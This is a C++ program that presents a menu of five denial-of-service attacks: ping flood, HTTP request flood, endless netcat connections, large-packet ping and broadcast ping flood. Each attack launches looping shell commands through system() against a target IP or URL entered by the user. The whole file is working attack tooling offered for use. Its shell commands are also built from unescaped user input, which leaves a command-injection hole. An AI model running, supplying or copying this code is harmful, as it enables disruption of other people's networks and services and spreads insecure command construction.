#include <iostream>
#include <string>
#include <cstdlib>

using namespace std;

int main() {
    int choice;
    cout << "Select an attack option:" << endl;
    cout << "1. Ping Flood" << endl;
    cout << "2. HTTP Request Flood" << endl;
    cout << "3. Infinite Netcat Connections" << endl;
    cout << "4. Continuous Large Packet Ping" << endl;
    cout << "5. Broadcast Ping Flood" << endl;
    cout << "Enter your choice: ";
    cin >> choice;

    switch (choice) {
        case 1: {
            string targetIP;
            cout << "Enter the target IP address: ";
            cin >> targetIP;

            string command = "gnome-terminal -- bash -c 'ping " + targetIP + "; exec bash'";
            cout << "Starting ping flood on " << targetIP << "..." << endl;
            system(command.c_str());
            break;
        }
        case 2: {
            string targetURL;
            int requestRate;
            cout << "Enter the target URL (e.g., http://example.com): ";
            cin >> targetURL;
            cout << "Enter the number of requests per second: ";
            cin >> requestRate;

            string command = "gnome-terminal -- bash -c 'while true; do for i in $(seq 1 " + to_string(requestRate) + "); do curl -s -o /dev/null " + targetURL + " & done; sleep 1; done; exec bash'";
            cout << "Starting HTTP request flood on " << targetURL << " at " << requestRate << " requests per second..." << endl;
            system(command.c_str());
            break;
        }
        case 3: {
            string targetIP;
            int port;
            cout << "Enter the target IP address: ";
            cin >> targetIP;
            cout << "Enter the target port: ";
            cin >> port;

            string command = "gnome-terminal -- bash -c 'while true; do nc " + targetIP + " " + to_string(port) + " & done; exec bash'";
            cout << "Starting infinite Netcat connections to " << targetIP << " on port " << port << "..." << endl;
            system(command.c_str());
            break;
        }
        case 4: {
            string targetIP;
            cout << "Enter the target IP address: ";
            cin >> targetIP;

            string command = "gnome-terminal -- bash -c 'while true; do ping -s 65000 -c 1 " + targetIP + "; done; exec bash'";
            cout << "Starting continuous large packet ping attack on " << targetIP << "..." << endl;
            system(command.c_str());
            break;
        }
        case 5: {
            string targetIP;
            cout << "Enter the target IP address for broadcast ping flood: ";
            cin >> targetIP;
            string command = "gnome-terminal -- bash -c 'while true; do ping -b " + targetIP + " -c 100 & done; exec bash'";
            cout << "Starting broadcast ping flood on " << targetIP << "..." << endl;
            system(command.c_str());
            break;
        }
        default:
            cout << "Invalid choice. Exiting program." << endl;
            break;
    }

    return 0;
}
